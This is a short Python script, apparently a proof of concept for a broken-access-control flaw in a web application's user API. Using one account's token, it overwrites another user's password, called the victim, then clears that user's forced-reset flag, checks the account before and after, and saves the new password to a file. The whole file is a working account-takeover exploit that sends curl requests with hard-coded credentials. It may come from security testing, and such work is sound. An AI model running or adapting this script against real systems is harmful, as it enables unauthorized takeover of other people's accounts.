import json,subprocess,os
H=os.environ['H']; T=os.environ['T']; BB=os.environ['BB']
NEWPW="Zx9!ato47aB"
def req(method,path,body=None):
    cmd=['curl','-s','-m','40','-o','/tmp/b','-w','%{http_code}','-X',method,H+path,
         '-H','token: '+T,'-H',BB,'-H','Content-Type: application/json',
         '-H','X-Auditboard-Product: System']
    if body is not None: cmd+=['-d',json.dumps(body)]
    return subprocess.run(cmd,capture_output=True,text=True).stdout.strip(), open('/tmp/b',encoding='utf-8',errors='replace').read()

print("=== BEFORE: victim 230 state ===")
c,b=req('GET','/api/v1/users/230')
u=json.loads(b)['users'][0]
print("  requires_password_change:",u.get('requires_password_change'),"updated_at:",u.get('updated_at'))

print("\n=== STEP 1: cross-account password write (231 -> 230) ===")
c,b=req('PUT','/api/v1/users/230',{"user":{"password":NEWPW}})
print("  PUT /users/230 ->",c)
print("  ",b[:400].replace(chr(10),' '))

print("\n=== STEP 2: clear forced-reset flag ===")
c,b=req('PUT','/api/v1/users/230',{"user":{"requires_password_change":False}})
print("  PUT ->",c, b[:200].replace(chr(10),' '))

print("\n=== AFTER: victim 230 state ===")
c,b=req('GET','/api/v1/users/230')
u=json.loads(b)['users'][0]
print("  requires_password_change:",u.get('requires_password_change'),"updated_at:",u.get('updated_at'))
open('/tmp/newpw','w').write(NEWPW)
